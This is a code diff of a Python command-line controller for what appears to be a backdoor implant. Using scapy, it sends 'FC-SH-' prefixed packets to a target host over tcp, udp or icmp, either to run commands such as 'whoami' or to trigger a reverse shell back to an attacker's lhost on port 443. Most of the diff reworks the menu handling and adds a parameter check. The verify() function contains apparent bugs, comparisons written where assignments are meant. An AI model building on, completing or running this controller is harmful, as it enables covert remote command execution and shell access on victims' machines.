@@ -1,5 +1,6 @@
 from email.mime import base
 from re import A
+from turtle import goto
 import scapy.all as scapy
 from prompt_toolkit import prompt
 from prompt_toolkit.history import FileHistory
@@ -22,19 +23,17 @@ set
 show
 - all
 
-
-
 """
 
 baseparams = {
-    "mode":"cmd",
+    "mode":"",
 }
 
 cmdparams = {
     "rhost": "",
     "rport": 445,
     "command": "whoami",
-    "lport": 6006,
+    "sport": 6006,
     "transport": "tcp"
 }
 
@@ -42,7 +41,8 @@ shellparams = {
     "rhost": "",
     "rport": 445,
     "lhost": "",
-    "lport": 6006,
+    "lport": 443,
+    "sport": 6006,
     "transport": "tcp"
 }
 
@@ -96,24 +96,36 @@ def main():
                         ).split()
         # click.echo_via_pager(user_input)
 
-        if(len(user_in) > 1):
-            if(user_in[0] == "set"):
-                baseparams[user_in[1]] = user_in[2]
-                if user_in[1] == "mode":
-                    if baseparams["mode"] == "shell":
-                        shellPrompt()
-                    elif baseparams["mode"] == "cmd":
-                        cmdPrompt()
+        if(len(user_in) == 3):
+            user_cmd = user_in[0]
+            op_1 = user_in[1]
+            op_2 = user_in[2]
+
+            if(user_cmd == "set"):
+                baseparams[op_1] = op_2
+                if op_1 == "mode":
+                    if baseparams["mode"] == "shell" or baseparams["mode"] == "cmd":
+                        pass
                     else:
                         print("mode set incorrectly")
                         baseparams["mode"] = ""
         elif len(user_in) == 1:
-            if user_in[0] == "exit":
+            user_cmd = user_in[0]
+
+            if user_cmd == "exit":
                 exit()
-            elif user_in[0] == "help":
+            elif user_cmd == "help":
                 print_help()
-            elif user_in[0] == "show":
+            elif user_cmd == "mode":
                 print_options(baseparams)
+            elif user_cmd == "interact":
+                if baseparams["mode"] == "shell":
+                    shellPrompt()
+                elif baseparams["mode"] == "cmd":
+                    cmdPrompt()
+                else:
+                    print("you must set mode")
+                    print_options(baseparams)
             else:
                 print_help()
         else:
@@ -129,18 +141,34 @@ def cmdPrompt():
                         ).split()
 
         if len(user_in) == 1:
-            if user_in[0] == "exit":
+            user_cmd = user_in[0]
+
+            if user_cmd == "back" or user_cmd == "exit":
                 return
-            elif user_in[0] == "options":
+            elif user_cmd == "options":
                 print_options(cmdparams)
-            elif user_in[0] == "send":
-                plaintext = "FC-SH-{}\00".format(shellparams["command"]) 
-                send(plaintext)
+            
+            elif user_cmd == "send":
+                if verify():
+                    plaintext = "FC-SH-{}\00".format(cmdparams["command"]) 
+                    send(plaintext)
             else:			
                 continue
+        elif len(user_in) == 3:
+            user_cmd = user_in[0]
+            op_1 = user_in[1]
+            op_2 = user_in[2]
+
+            if user_cmd == "set":
+                if op_1 in cmdparams.keys():
+                    cmdparams[op_1] = op_2
+                    print_options(cmdparams)
+                else:
+                    print("cmd help")
+            else:
+                print("cmd help")
         else:
             print("cmd help")
-            continue
 
 
 def shellPrompt():
@@ -152,19 +180,70 @@ def shellPrompt():
                         ).split()
 
         if len(user_in) == 1:
-            if user_in[0] == "exit":
+            user_cmd = user_in[0]
+
+            if user_cmd == "back" or user_cmd == "exit":
                 return
-            elif user_in[0] == "options":
+            elif user_cmd == "options":
                 print_options(shellparams)
                 continue
-            elif user_in[0] == "send":
-                plaintext = "FC-SH-{}\00".format(shellparams["lhost"])
-                send(plaintext) 
+            elif user_cmd == "send":
+                if verify():
+                    # TODO listen here for callback
+
+                    plaintext = "FC-SH-{}\00".format(shellparams["lhost"])
+                    send(plaintext) 
             else:			
                 continue
+        elif len(user_in) == 3:
+            user_cmd = user_in[0]
+            op_1 = user_in[1]
+            op_2 = user_in[2]
+
+            if user_cmd == "set":
+                if op_1 in shellparams.keys():
+                    shellparams[op_1] = op_2
+                    print_options(shellparams)
+                else:
+                    print("shell help")
+            else:
+                print("shell help")
         else:
             print("shell help")
-            continue
+
+
+def verify():
+    passing = False
+
+    if baseparams["mode"] == "cmd":
+        if cmdparams["transport"] == "tcp" or cmdparams["transport"] == "udp" or cmdparams["transport"] == "icmp":
+            passing = True
+        else:
+            print('transport incorrect')
+            shellparams["transport"] == "tcp"
+        
+        if cmdparams["rhost"] == "": # blank or is invalid ip
+            print("rhost incorrect")
+            return False
+
+
+    elif baseparams["mode"] == "shell":
+        if shellparams["transport"] == "tcp" or shellparams["transport"] == "udp" or shellparams["transport"] == "icmp":
+            passing = True
+        else:
+            print('transport incorrect')
+            shellparams["transport"] == "tcp"
+        
+        if shellparams["rhost"] == "": # blank or is invalid ip
+            print('rhost incorrect')
+            return False
+        
+        if shellparams["lhost"] == "": # blank or is invalid ip
+            print('lhost incorrect')
+            return False
+
+
+    return passing
 
 
 def send(plaintext):
